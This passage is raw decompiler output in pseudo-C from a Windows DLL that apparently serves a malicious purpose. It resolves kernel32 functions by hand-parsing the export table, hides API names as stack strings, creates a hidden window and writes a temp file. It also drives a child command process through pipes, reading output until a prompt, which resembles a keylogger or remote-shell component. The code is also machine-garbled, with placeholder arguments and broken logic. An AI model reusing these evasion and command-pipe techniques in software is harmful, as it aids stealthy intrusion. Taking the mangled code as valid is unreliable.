    int32_t v379 = (v167 & 255 | v88) + (v210 ? 102 : 6); // 0x10002099
    v211 = v210 | (char)v379 > 153;
    v168 = v379;
    goto lab__thread496;
  lab__thread496:;
    int32_t v380 = (v168 & 255 | v88) + (v211 ? 102 : 6); // 0x1000209a
    v212 = v211 | (char)v380 > 153;
    v169 = v380;
    goto lab__thread498;
  lab__thread498:;
    int32_t v381 = (v169 & 255 | v88) + (v212 ? 102 : 6); // 0x1000209b
    v213 = v212 | (char)v381 > 153;
    v170 = v381;
    goto lab__thread500;
  lab__thread500:;
    int32_t v382 = (v170 & 255 | v88) + (v213 ? 102 : 6); // 0x1000209c
    v214 = v213 | (char)v382 > 153;
    v171 = v382;
    goto lab__thread502;
  lab__thread502:;
    int32_t v383 = (v171 & 255 | v88) + (v214 ? 102 : 6); // 0x1000209d
    v215 = v214 | (char)v383 > 153;
    v172 = v383;
    goto lab__thread504;
  lab__thread504:;
    int32_t v384 = (v172 & 255 | v88) + (v215 ? 102 : 6); // 0x1000209e
    v216 = v215 | (char)v384 > 153;
    v173 = v384;
    goto lab__thread506;
  lab__thread506:;
    int32_t v385 = (v173 & 255 | v88) + (v216 ? 102 : 6); // 0x1000209f
    v217 = v216 | (char)v385 > 153;
    v174 = v385;
    goto lab__thread508;
  lab__thread508:;
    int32_t v386 = (v174 & 255 | v88) + (v217 ? 102 : 6); // 0x100020a0
    v218 = v217 | (char)v386 > 153;
    v175 = v386;
    goto lab__thread510;
  lab__thread510:;
    int32_t v387 = (v175 & 255 | v88) + (v218 ? 102 : 6); // 0x100020a1
    v219 = v218 | (char)v387 > 153;
    v176 = v387;
    goto lab_dec_label_pc_unknown_9;
  lab_dec_label_pc_unknown_9:
    v177 = (v219 ? 102 : 6) + v176;
    goto lab_dec_label_pc_0x10002076;
  lab_dec_label_pc_0x10002076:;
    int32_t v388 = v177 & 243 | 12; // 0x100020a3
    int32_t v389 = ((char)v388 > 153 ? 102 : 6) + v388; // 0x100020a5
    bool v390 = (char)v388 > 153 | (char)v389 > 153;
    int32_t v391 = (v390 ? 102 : 6) + v389; // 0x100020a6
    uint32_t v392 = v88 | (v390 | (char)v391 > 153 ? 102 : 6) + v391 & 241 | 0x11100f0e; // 0x100020a8
    int32_t v393; // 0x10002050
    char v394 = v393; // 0x100020ad
    int32_t v395; // 0x10002050
    unsigned char v396 = *(char *)&v395; // 0x100020ad
    unsigned char v397 = (char)v392; // 0x100020af
    char v398 = v396 > -1 - v394 ? 22 : 21; // 0x100020af
    bool v399 = v396 > -1 - v394 ? v398 + v397 <= v397 : v397 > 234; // 0x100020af
    unsigned char v400 = *(char *)&v25; // 0x100020b3
    char v401 = v392 / 256; // 0x100020b3
    char v402 = v399; // 0x100020b3
    unsigned char v403 = v402 + v401; // 0x100020b3
    char v404 = v400 - v403; // 0x100020b3
    bool v405 = v399 ? v403 != -1 | v400 < v404 - v402 : v400 < v403; // 0x100020b3
    *(char *)v25 = v404;
    int32_t * v406 = (int32_t *)(v393 & -256 | (int32_t)(v396 + v394)); // 0x100020b5
    uint32_t v407 = *v406; // 0x100020b5
    int32_t v408 = v405; // 0x100020b5
    uint32_t v409 = v395 + v408; // 0x100020b5
    int32_t v410 = v407 - v409; // 0x100020b5
    bool v411 = v405 ? v409 != -1 | v407 < v410 - v408 : v407 < v409; // 0x100020b5
    *v406 = v410;
    int32_t v412; // 0x10002050
    int32_t v413 = (v25 | (int32_t)&v412) - v25 + (int32_t)v411; // 0x100020b7
    *(char *)v86 = *(char *)&v86 & v401;
    int32_t v414 = v413 & *(int32_t *)-0x333333da; // 0x10002123
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    if (*(int32_t *)(v414 + 8) != 513) {
        int32_t result = DefWindowProcW(&g161, (int32_t)&g161, (int32_t)&g161, (int32_t)&g161); // 0x10002141
        return result;
    }
    // 0x10002147
    *(int32_t *)(v414 - 8) = (int32_t)&g112;
    *(int32_t *)(v414 - 12) = 0;
    *(int32_t *)(v414 - 16) = 0;
    *(int32_t *)(v414 - 20) = 0x10001a30;
    *(int32_t *)(v414 - 24) = 0;
    *(int32_t *)(v414 - 28) = 0;
    int32_t * threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t (*)(int32_t *))&g161, &g161, (int32_t)&g161, &g161); // 0x10002159
    g113 = (int32_t)threadHandle;
    return 0;
}

// Address range: 0x10002170 - 0x1000255c
int32_t function_10002170(void) {
    int32_t moduleHandle = (int32_t)GetModuleHandleA("kernel32.dll"); // 0x10002192
    int32_t v1 = 0x64616f4c; // bp-312, 0x1000219a
    int32_t v2 = *(int32_t *)(moduleHandle + 120 + *(int32_t *)(moduleHandle + 60)) + moduleHandle; // 0x100021c2
    int32_t v3 = function_10007210(moduleHandle, (char *)&v1); // 0x100021ce
    uint16_t v4 = *(int16_t *)(2 * v3 + moduleHandle + *(int32_t *)(v2 + 36)); // 0x100021dc
    int32_t v5 = *(int32_t *)(*(int32_t *)(v2 + 28) + moduleHandle + 4 * (int32_t)v4); // 0x100021e6
    v1 = 0x72657355;
    g116 = v5 + moduleHandle;
    _srand(GetTickCount());
    GetTempPathW(260, (int16_t *)&g90);
    __asm_movdqu(0, __asm_movdqa_9(g28));
    lstrcatW((int16_t *)0x740061, NULL);
    int16_t * v6 = (int16_t *)&g90; // bp-468, 0x10002286
    int32_t * v7 = CreateFileW((int16_t *)&g90, 1, 1, NULL, 3, 128, NULL); // 0x1000228b
    int32_t v8 = (int32_t)&v6; // 0x10002292
    int32_t v9 = (int32_t)v7; // 0x10002292
    if (v7 == (int32_t *)-1) {
        int32_t * hFile = CreateFileW((int16_t *)&g90, 2, 1, NULL, 2, 128, NULL); // 0x100022ac
        v9 = (int32_t)hFile;
        WriteFile(hFile, &g70, 2, &g109, NULL);
        int32_t v10; // 0x10002170
        __asm_movdqu((int128_t)v10, __asm_movdqa_9(0x756f79614c6472616f6279654b746547));
        WriteFile((int32_t *)0x6d614e74, (int32_t *)0x5765, 0, &g161, (struct _OVERLAPPED *)&g161);
        function_100058f0();
        int32_t lpString; // bp-340, 0x10002170
        int32_t v11 = lstrlenW((int16_t *)&lpString); // 0x1000232a
        int32_t v12 = v9; // bp-564, 0x1000233b
        int32_t lpBuffer; // bp-344, 0x10002170
        WriteFile(hFile, &lpBuffer, 2 * v11, &g161, (struct _OVERLAPPED *)&g161);
        v8 = &v12;
    }
    int32_t v13 = v8;
    int32_t * v14 = (int32_t *)(v13 - 4); // 0x1000233e
    *v14 = v9;
    CloseHandle(&g161);
    *(int32_t *)(v13 + 156) = 0x79004d;
    *(int32_t *)(v13 + 160) = 0x730043;
    *(int32_t *)(v13 + 164) = 0x31004c;
    *(int16_t *)(v13 + 168) = 0;
    int32_t * v15 = GetDesktopWindow(); // 0x10002370
    int32_t v16 = v13 + 88; // 0x10002376
    int32_t v17 = v13 - 8; // 0x1000237a
    int32_t * v18 = (int32_t *)v17; // 0x1000237a
    *v18 = v16;
    *(int32_t *)(v13 - 12) = (int32_t)v15;
    GetWindowRect(&g161, (struct tagRECT *)&g161);
    int32_t v19 = v13 + 92; // 0x10002386
    int32_t v20 = v13 - 16; // 0x10002390
    *(int32_t *)v20 = 0;
    *(int32_t *)(v13 + 4) = 48;
    int32_t v21 = v13 + 8; // 0x1000239a
    int32_t * v22 = (int32_t *)v21; // 0x1000239a
    *v22 = 8;
    int32_t * v23 = (int32_t *)(v13 + 12); // 0x100023a2
    *v23 = 0x10002130;
    int32_t * v24 = (int32_t *)(v13 + 16); // 0x100023aa
    *v24 = 0;
    int32_t v25 = v13 + 20; // 0x100023b2
    int32_t * v26 = (int32_t *)v25; // 0x100023b2
    *v26 = 0;
    int32_t * v27 = GetModuleHandleW((int16_t *)&g161); // 0x100023ba
    *(int32_t *)(v13 - 20) = 0x7f00;
    *(int32_t *)(v13 - 24) = 0;
    *v26 = (int32_t)v27;
    int32_t * v28 = (int32_t *)(v13 + 24); // 0x100023c7
    *v28 = 0;
    *v26 = (int32_t)LoadCursorW(&g161, (int16_t *)&g161);
    *(int32_t *)(v13 - 28) = 0x7f00;
    *(int32_t *)(v13 - 32) = 0;
    *v28 = 6;
    int32_t * v29 = (int32_t *)(v13 + 28); // 0x100023ef
    *v29 = 0;
    *(int32_t *)(v13 + 32) = v13 + 136;
    int32_t * v30 = LoadIconW(&g161, (int16_t *)&g161); // 0x100023fb
    int128_t v31 = __asm_movdqa_9(g52); // 0x10002401
    *v29 = (int32_t)v30;
    __asm_movdqu(*(int128_t *)(v13 + 76), v31);
    *(char *)v19 = 0;
    function_100058f0();
    *(int32_t *)(v13 - 36) = v20;
    *(int32_t *)(v13 - 40) = 0;
    *(int32_t *)(v13 - 44) = 0;
    *(int32_t *)(v13 - 48) = (int32_t)GetModuleHandleW((int16_t *)&g161);
    int32_t v32 = v13 - 52; // 0x10002433
    *(int32_t *)v32 = 0;
    *(int32_t *)(v13 - 56) = 0;
    *(int32_t *)(v13 - 60) = 1;
    *(int32_t *)(v13 - 64) = 1;
    *(int32_t *)(v13 - 68) = *(int32_t *)v19;
    *(int32_t *)(v13 - 72) = *(int32_t *)v16;
    *(int32_t *)(v13 - 76) = 0xa0000;
    *(int32_t *)(v13 - 80) = (int32_t)&g7;
    *(int32_t *)(v13 - 84) = v13 + 120;
    *(int32_t *)(v13 - 88) = 0;
    int32_t * v33 = CreateWindowExW((int32_t)&g161, (int16_t *)&g161, (int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (int32_t)&g161, (int32_t)&g161, (int32_t)&g161, &g161, &g161, &g161, &g161); // 0x10002451
    int32_t v34 = (int32_t)v33; // 0x10002451
    *(int32_t *)(v13 - 92) = 0;
    *(int32_t *)(v13 - 96) = v34;
    g111 = v34;
    ShowWindow(&g161, (int32_t)&g161);
    *(int32_t *)(v13 - 100) = g111;
    UpdateWindow(&g161);
    *v22 = 0x74736f50;
    *v23 = 0x7373654d;
    *v24 = 0x41656761;
    *(char *)v25 = 0;
    function_100058f0();
    *(int32_t *)(v13 - 104) = 0;
    *(int32_t *)(v13 - 108) = 0;
    *(int32_t *)(v13 - 112) = 513;
    *(int32_t *)(v13 - 116) = g111;
    *v18 = 0x4d746547;
    *v14 = 0x61737365;
    *(int32_t *)v13 = 0x576567;
    function_100058f0();
    int128_t v35 = __asm_movdqa_9(g54); // 0x100024d1
    char * v36 = (char *)v21; // 0x100024df
    *v36 = 0;
    int128_t * v37 = (int128_t *)v17; // 0x100024e6
    __asm_movdqu(*v37, v35);
    function_100058f0();
    int128_t v38 = __asm_movdqa_9(g41); // 0x100024f1
    *v36 = 0;
    __asm_movdqu(*v37, v38);
    function_100058f0();
    *(int32_t *)(v13 - 120) = 0;
    *(int32_t *)(v13 - 124) = 0;
    *(int32_t *)(v13 - 128) = 0;
    int32_t v39 = v13 - 132; // 0x1000251d
    *(int32_t *)v39 = v32;
    if (v32 == 0) {
        // 0x10002543
        return _40___security_check_cookie_40_4();
    }
    int32_t v40 = v39;
    *(int32_t *)(v40 - 4) = v40 + 64;
    *(int32_t *)(v40 - 8) = v40 + 60;
    *(int32_t *)(v40 - 12) = 0;
    *(int32_t *)(v40 - 16) = 0;
    *(int32_t *)(v40 - 20) = 0;
    int32_t v41 = v40 + 56; // 0x10002538
    int32_t v42 = v40 - 24; // 0x1000253c
    *(int32_t *)v42 = v41;
    while (v41 != 0) {
        // 0x10002524
        v40 = v42;
        *(int32_t *)(v40 - 4) = v40 + 64;
        *(int32_t *)(v40 - 8) = v40 + 60;
        *(int32_t *)(v40 - 12) = 0;
        *(int32_t *)(v40 - 16) = 0;
        *(int32_t *)(v40 - 20) = 0;
        v41 = v40 + 56;
        v42 = v40 - 24;
        *(int32_t *)v42 = v41;
    }
    // 0x10002543
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10002560 - 0x10002690
int32_t function_10002560(int32_t a1, uint32_t a2, uint32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    uint32_t v1 = *(int32_t *)(a1 + 16); // 0x1000256e
    int32_t v2; // 0x10002560
    int32_t v3; // 0x10002560
    char * v4; // bp-20, 0x10002560
    if (v1 < a2) {
        // 0x10002662
        v4 = "invalid string position";
        ?_Xinvalid_argument@std@@YAXPBD@Z("invalid string position");
        v2 = (int32_t)&v4;
        goto lab_0x1000266c;
    } else {
        // 0x10002579
        int32_t v5; // bp-16, 0x10002560
        int32_t v6 = &v5; // 0x10002568
        uint32_t v7 = v1 - a2; // 0x10002579
        int32_t v8 = v7 > a3 ? a3 : v7; // 0x1000257e
        int32_t v9; // bp-24, 0x10002560
        int32_t result; // 0x10002560
        if (result != a1) {
            // 0x100025cd
            v3 = v6;
            if (v8 != -1) {
                int32_t * v10 = (int32_t *)(result + 20); // 0x100025d6
                uint32_t v11 = *v10; // 0x100025d6
                int32_t v12; // 0x10002560
                if (v11 >= v8) {
                    // 0x10002601
                    v12 = v6;
                    if (v8 == 0) {
                        // 0x10002605
                        *(int32_t *)(result + 16) = v8;
                        if (v11 < 16) {
                            // 0x1000261b
                            *(char *)result = 0;
                            return result;
                        }
                        // 0x1000260d
                        *(char *)a2 = 0;
                        return result;
                    }
                } else {
                    int32_t v13 = *(int32_t *)(result + 16); // 0x100025dd
                    v4 = (char *)v13;
                    v9 = v8;
                    int32_t v14; // 0x10002560
                    int32_t v15; // 0x10002560
                    int32_t v16; // 0x10002560
                    int32_t v17; // 0x10002560
                    function_10002830(v8, v13, v14, v15, v17, v16);
                    v12 = &v9;
                    if (v8 == 0) {
                        // 0x10002659
                        return result;
                    }
                }
                int32_t v18 = a1; // 0x100025f3
                if (*(int32_t *)(a1 + 20) >= 16) {
                    // 0x100025f5
                    v18 = *(int32_t *)a1;
                }
                if (v8 != 0) {
                    // 0x1000262d
                    *(int32_t *)(v12 - 4) = v8;
                    *(int32_t *)(v12 - 8) = v18 + a2;
                    *(int32_t *)(v12 - 12) = *v10 < 16 ? result : a2;
                    function_1000c0f0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
                }
                // 0x1000263b
                *(int32_t *)(result + 16) = v8;
                if (*v10 >= 16) {
                    // 0x10002644
                    *(char *)(v8 + a2) = 0;
                    return result;
                }
                // 0x10002653
                *(char *)(v8 + result) = 0;
                // 0x10002659
                return result;
            }
            goto lab_0x10002676;
        } else {
            uint32_t v19 = v8 + a2; // 0x10002586
            int32_t * v20 = (int32_t *)(result + 16); // 0x10002589
            v2 = v6;
            if (*v20 >= v19) {
                // 0x10002592
                *v20 = v19;
                v4 = (char *)a2;
                v9 = 0;
                if (*(int32_t *)(result + 20) < 16) {
                    // 0x100025b4
                    *(char *)(v19 + result) = 0;
                    return result;
                }
                // 0x1000259b
                *(char *)(v19 + a2) = 0;
                return result;
            }
            goto lab_0x1000266c;
        }
    }
  lab_0x1000266c:;
    int32_t v21 = v2 - 4; // 0x1000266c
    *(int32_t *)v21 = (int32_t)"invalid string position";
    ?_Xinvalid_argument@std@@YAXPBD@Z((char *)&g161);
    v3 = v21;
    goto lab_0x10002676;
  lab_0x10002676:
    // 0x10002676
    *(int32_t *)(v3 - 4) = (int32_t)"string too long";
    _3f__Xinvalid_argument_40_std_40__40_YAXPBD_40_Z((char *)&g161);
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    return __asm_int3();
}

// Address range: 0x10002690 - 0x10002830
int32_t function_10002690(uint32_t a1, int32_t a2) {
    // 0x10002690
    int32_t result3; // 0x10002690
    int32_t v1; // bp-16, 0x10002690
    uint32_t v2; // 0x10002690
    int32_t v3; // 0x10002690
    int32_t v4; // 0x10002690
    int32_t result; // 0x10002690
    if (a1 != 0) {
        uint32_t v5 = *(int32_t *)(result + 20); // 0x1000269e
        uint32_t v6 = v5 < 16 ? result : v5;
        result3 = v5;
        if (v6 <= a1) {
            // 0x100026b0
            result3 = v5;
            if (*(int32_t *)(result + 16) + v6 > a1) {
                // 0x100026c4
                v1 = a2;
                if (v5 < 16) {
                    // 0x100026df
                    return function_10002560(result, a1 - result, a2, v2, v4, v3);
                }
                // 0x100026c9
                return function_10002560(result, a1 - v5, a2, v2, v4, v3);
            }
        }
    }
    // 0x100026f5
    int32_t v7; // bp-24, 0x10002690
    if (a2 != -1) {
        int32_t * v8 = (int32_t *)(result + 20); // 0x100026fe
        uint32_t v9 = *v8; // 0x100026fe
        int32_t * v10; // 0x10002690
        int32_t v11; // 0x10002690
        int32_t v12; // 0x10002690
        int32_t * v13; // 0x10002690
        int32_t result2; // 0x10002690
        if (v9 >= a2) {
            int32_t * v14 = (int32_t *)(result + 16);
            v10 = v14;
            v11 = v9;
            v13 = &v1;
            v12 = result3;
            if (a2 == 0) {
                // 0x10002722
                *v14 = a2;
                if (v9 < 16) {
                    // 0x10002738
                    *(char *)result = 0;
                    return result;
                }
                // 0x1000272a
                *(char *)result3 = 0;
                return result;
            }
        } else {
            int32_t * v15 = (int32_t *)(result + 16);
            v7 = a2;
            int32_t v16; // 0x10002690
            function_10002830(a2, *v15, v16, v2, v4, v3);
            if (a2 == 0) {
                // 0x10002773
                return result2;
            }
            // 0x10002705
            v10 = v15;
            v11 = *v8;
            v13 = &v7;
        }
        int32_t v17 = (int32_t)v13;
        *(int32_t *)(v17 - 4) = a2;
        *(int32_t *)(v17 - 8) = a1;
        *(int32_t *)(v17 - 12) = v11 < 16 ? result : v12;
        function_1000c0f0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
        *v10 = a2;
        if (*v8 >= 16) {
            // 0x1000275e
            *(char *)(v12 + a2) = 0;
            return result;
        }
        // 0x1000276d
        *(char *)(result + a2) = 0;
        // 0x10002773
        return result2;
    }
    // 0x1000277c
    _3f__Xinvalid_argument_40_std_40__40_YAXPBD_40_Z("string too long");
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    int32_t v18; // bp-4, 0x10002690
    v7 = &v18;
    int32_t * v19 = (int32_t *)(result3 + 16); // 0x1000279a
    uint32_t v20 = *v19; // 0x1000279a
    if (v20 < v1) {
        // 0x1000281f
        ?_Xinvalid_argument@std@@YAXPBD@Z("invalid string position");
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        return __asm_int3();
    }
    if (v20 - v1 <= v2) {
        // 0x100027ac
        *v19 = v1;
        if (*(int32_t *)(result3 + 20) < 16) {
            // 0x100027c3
            *(char *)(v1 + result3) = 0;
            return result3;
        }
        // 0x100027b5
        *(char *)(*(int32_t *)result3 + v1) = 0;
        return result3;
    }
    // 0x100027cf
    if (v2 == 0) {
        // 0x10002773
        return result3;
    }
    int32_t * v21 = (int32_t *)(result3 + 20); // 0x100027d3
    uint32_t v22 = *v21; // 0x100027d3
    int32_t v23 = result3; // 0x100027d7
    if (v22 >= 16) {
        // 0x100027d9
        v23 = *(int32_t *)result3;
    }
    int32_t v24 = v20 - v2; // 0x100027df
    int32_t v25 = v24 - v1; // 0x100027e7
    int32_t v26 = v22; // 0x100027e9
    if (v25 != 0) {
        int32_t v27 = v23 + v1; // 0x100027e2
        _memcpy((int32_t *)v27, (int32_t *)(v27 + v2), v25);
        v26 = *v21;
    }
    // 0x100027f9
    *v19 = v24;
    if (v26 >= 16) {
        // 0x10002803
        *(char *)(*(int32_t *)result3 + v24) = 0;
        return result3;
    }
    // 0x10002811
    *(char *)(v24 + result3) = 0;
    // 0x10002773
    return result3;
}

// Address range: 0x10002830 - 0x1000297d
int32_t function_10002830(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x10002840
    __writefsdword(0, (int32_t)&v1);
    uint32_t v2 = a1 | 15; // 0x10002865
    int32_t v3 = a1; // 0x1000286b
    int32_t v4; // 0x10002830
    if (v2 < 0xfffffffe) {
        uint32_t v5 = *(int32_t *)(v4 + 20); // 0x10002871
        uint32_t v6 = v5 / 2; // 0x1000287d
        v3 = v2;
        if (v6 > v2 / 3) {
            // 0x10002885
            v3 = v5 > -2 - v6 ? -2 : v6 + v5;
        }
    }
    int32_t v7 = v3 + 1; // 0x10002898
    int32_t result = 0; // 0x100028a9
    if (v7 != 0) {
        // 0x100028b0
        result = _3f__3f_2_40_YAPAXI_40_Z(v7);
        if (result == 0) {
            // 0x100028c0
            _3f__Internal_throw_exception_40__Concurrent_queue_base_v4_40_details_40_Concurrency_40__40_IBEXXZ();
            function_10002990(a1 + 1);
            return 0x100028e5;
        }
    }
    int32_t * v8 = (int32_t *)(v4 + 20);
    int32_t v9 = v7; // 0x100028f6
    if (a2 != 0) {
        // 0x100028f8
        v9 = *v8 < 16 ? v4 : v7;
        function_1000c0f0(result, v9, a2);
    }
    // 0x10002940
    if (*v8 >= 16) {
        // 0x10002946
        _free((int32_t *)v9);
    }
    // 0x10002950
    *(char *)v4 = 0;
    *(int32_t *)v4 = result;
    *v8 = v3;
    *(int32_t *)(v4 + 16) = a2;
    *(char *)((v3 < 16 ? v4 : result) + a2) = 0;
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x10002980 - 0x10002983
int32_t function_10002980(int32_t a1) {
    // 0x10002980
    int32_t result; // 0x10002980
    return result;
}

// Address range: 0x10002990 - 0x100029c3
int32_t function_10002990(int32_t a1) {
    // 0x10002990
    if (a1 == 0) {
        // 0x100029b0
        return 0;
    }
    int32_t result = _3f__3f_2_40_YAPAXI_40_Z(a1); // 0x100029a2
    if (result != 0) {
        // 0x100029b0
        return result;
    }
    // 0x100029b6
    _3f__Internal_throw_exception_40__Concurrent_queue_base_v4_40_details_40_Concurrency_40__40_IBEXXZ();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    return __asm_int3();
}

// Address range: 0x100029d0 - 0x10002a23
int32_t function_100029d0(int32_t * a1) {
    int32_t v1 = 0x7fffffff;
    int32_t v2; // 0x100029d0
    int32_t v3; // 0x100029d0
    while (*(int16_t *)v3 != 0) {
        int32_t v4 = v1 - 1; // 0x100029e8
        v3 += 2;
        v2 = v4;
        if (v4 == 0) {
            goto lab_0x100029f1;
        }
        v1 = v4;
    }
    // 0x100029ed
    v2 = v1;
    int32_t result = 0; // 0x100029ef
    if (v1 == 0) {
      lab_0x100029f1:
        // 0x100029f1
        result = -0x7ff8ffa9;
    }
    // 0x100029f6
    if (a1 == NULL) {
        // 0x10002a1a
        return result;
    }
    if (result >= 0) {
        // 0x10002a02
        *a1 = 0x7fffffff - v2;
        return 0;
    }
    // 0x10002a14
    *a1 = 0;
    // 0x10002a1a
    return result;
}

// Address range: 0x10002a30 - 0x10002a82
int32_t function_10002a30(int32_t a1) {
    // 0x10002a30
    int32_t v1; // 0x10002a30
    int32_t v2 = v1;
    int32_t v3 = 0x7fffffff;
    int32_t v4; // 0x10002a30
    char v5 = *(char *)(a1 - v4 + v2); // 0x10002a47
    while (v5 != 0) {
        // 0x10002a4e
        *(char *)v2 = v5;
        int32_t v6 = v2 + 1; // 0x10002a50
        int32_t v7 = v3 - 1; // 0x10002a51
        int32_t v8 = v6; // 0x10002a45
        if (v7 == 1) {
            // 0x10002a76
            *(char *)v8 = 0;
            return 0;
        }
        v2 = v6;
        v3 = v7;
        v5 = *(char *)(a1 - v4 + v2);
    }
    // 0x10002a63
    if (v3 != 0) {
        // 0x10002a76
        *(char *)v2 = 0;
        return 0;
    }
    // 0x10002a67
    *(char *)(v2 - 1) = (char)v3;
    return -0x7ff8ff86;
}

// Address range: 0x10002a90 - 0x10002d90
int32_t function_10002a90(int32_t a1) {
    // 0x10002a90
    __chkstk();
    int32_t v1; // bp-127, 0x10002a90
    _memset(&v1, 0, 99);
    char * v2 = (char *)0x6e72656b; // bp-128, 0x10002acc
    int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)0x6e72656b); // 0x10002ae9
    int32_t v3 = *(int32_t *)(*(int32_t *)(moduleHandle + 60) + 120 + moduleHandle) + moduleHandle; // 0x10002b23
    int32_t v4 = function_10007210(0x64616f4c, (char *)0x7262694c); // 0x10002b2f
    uint16_t v5 = *(int16_t *)(2 * v4 + moduleHandle + *(int32_t *)(v3 + 36)); // 0x10002b3d
    int32_t v6 = *(int32_t *)(*(int32_t *)(v3 + 28) + moduleHandle + 4 * (int32_t)v5); // 0x10002b47
    int32_t v7 = v6 + moduleHandle; // 0x10002b4d
    g137 = v7;
    _memset((int32_t *)v7, (int32_t)&g161, (int32_t)&g161);
    int32_t v8 = *(int32_t *)(v7 + 120 + *(int32_t *)(v7 + 60)) + v7; // 0x10002b97
    int32_t v9 = function_10007210(0x64616552, (char *)0x656c6946); // 0x10002ba3
    uint16_t v10 = *(int16_t *)(2 * v9 + v7 + *(int32_t *)(v8 + 36)); // 0x10002bb1
    int32_t v11 = *(int32_t *)(*(int32_t *)(v8 + 28) + v7 + 4 * (int32_t)v10); // 0x10002bbd
    int32_t ** lpPipeAttributes = (int32_t **)12; // bp-10728, 0x10002bc2
    CreatePipe((int32_t **)12, NULL, (struct _SECURITY_ATTRIBUTES *)1, v11 + v7);
    SetHandleInformation((int32_t *)g124, 1, 0);
    CreatePipe((int32_t **)&g118, (int32_t **)&g144, (struct _SECURITY_ATTRIBUTES *)&lpPipeAttributes, 0);
    SetHandleInformation((int32_t *)g144, 1, 0);
    int128_t v12; // 0x10002a90
    int128_t v13; // 0x10002a90
    __asm_movdqa(v13, __asm_xorps(v12, v12));
    _memset(&g161, (int32_t)&g161, (int32_t)&g161);
    _memset((int32_t *)68, (int32_t)&g161, (int32_t)&g161);
    function_100058f0();
    v2 = NULL;
    g131 = v13;
    int32_t v14 = (int32_t)&v2; // 0x10002d20
    *(int32_t *)(v14 - 4) = 0;
    int32_t v15; // bp-10716, 0x10002a90
    *(int32_t *)(v14 - 8) = (int32_t)&v15;
    *(int32_t *)(v14 - 12) = 0x2710;
    int32_t v16; // bp-10704, 0x10002a90
    *(int32_t *)(v14 - 16) = (int32_t)&v16;
    v14 -= 20;
    *(int32_t *)v14 = g124;
    while (v15 != 0) {
        if (v15 >= 0x2710) {
            // 0x10002d8a
            function_1000b43d();
            return __asm_int3();
        }
        // 0x10002d57
        int32_t v17; // bp-16, 0x10002a90
        int32_t v18 = v15 + (int32_t)&v17;
        *(char *)(v18 - 0x29c0) = 0;
        if (*(char *)(v18 - 0x29c1) == 62) {
            // break -> 0x10002d6d
            break;
        }
        *(int32_t *)(v14 - 4) = 0;
        *(int32_t *)(v14 - 8) = (int32_t)&v15;
        *(int32_t *)(v14 - 12) = 0x2710;
        *(int32_t *)(v14 - 16) = (int32_t)&v16;
        v14 -= 20;
        *(int32_t *)v14 = g124;
    }
    // 0x10002d6d
    g125 = 1;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10002d90 - 0x10003048
int32_t function_10002d90(int32_t a1, int32_t a2, int32_t lpBuffer) {
    // 0x10002d90
    int32_t v1; // bp-115, 0x10002d90
    _memset(&v1, 0, 99);
    int32_t lpModuleName = 0x6e72656b; // bp-116, 0x10002dd4
    int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)&lpModuleName); // 0x10002df1
    int32_t v2 = 0x64616f4c; // bp-324, 0x10002df9
    int32_t v3 = *(int32_t *)(moduleHandle + 120 + *(int32_t *)(moduleHandle + 60)) + moduleHandle; // 0x10002e2b
    int32_t v4 = function_10007210(moduleHandle, (char *)&v2); // 0x10002e37
    uint16_t v5 = *(int16_t *)(2 * v4 + moduleHandle + *(int32_t *)(v3 + 36)); // 0x10002e45
    int32_t v6 = *(int32_t *)(v3 + 28); // 0x10002e49
    int32_t v7 = *(int32_t *)(v6 + moduleHandle + 4 * (int32_t)v5) + moduleHandle; // 0x10002e55
    g137 = v7;
    function_10007210(v7, "GetTempPathA");
    int32_t * memoryHandle = LocalAlloc(64, 0x186a0); // 0x10002ea3
    if (g125 == 0) {
        // 0x10002eb4
        function_10002a90((int32_t)&g161);
    }
    int32_t v8 = (int32_t)memoryHandle; // 0x10002ea3
    char * lpString1 = (char *)lpBuffer; // 0x10002ec5
    lstrcatA(lpString1, "\n");
    int32_t nNumberOfBytesToWrite = lstrlenA(lpString1); // 0x10002ed5
    WriteFile((int32_t *)g144, (int32_t *)lpBuffer, nNumberOfBytesToWrite, &g161, (struct _OVERLAPPED *)&g161);
    int32_t v9 = 1000; // bp-1424, 0x10002ee9
    Sleep(1000);
    int32_t v10; // bp-1328, 0x10002d90
    int32_t v11 = &v10;
    int32_t v12 = &v9; // 0x10002efc
    int32_t v13 = 0; // 0x10002efc
    *(int32_t *)(v12 - 4) = v11;
    int32_t v14 = v12 - 8; // 0x10002f07
    *(int32_t *)v14 = g131;
    GetExitCodeProcess(&g161, &g161);
    int32_t v15 = v14; // 0x10002f19
    while (v10 == 259) {
        // 0x10002f1b
        *(int32_t *)(v12 - 12) = 0;
        int32_t v16; // bp-1352, 0x10002d90
        *(int32_t *)(v12 - 16) = (int32_t)&v16;
        *(int32_t *)(v12 - 20) = 0x186a0;
        *(int32_t *)(v12 - 24) = v13 + v8;
        v12 -= 28;
        *(int32_t *)v12 = g124;
        bool v17 = ReadFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161); // 0x10002f33
        v15 = v12;
        if (!v17) {
            // break -> 0x10002f54
            break;
        }
        // 0x10002f3d
        v15 = v12;
        if (v16 == 0) {
            // break -> 0x10002f54
            break;
        }
        // 0x10002f47
        v13 += v16;
        v15 = v12;
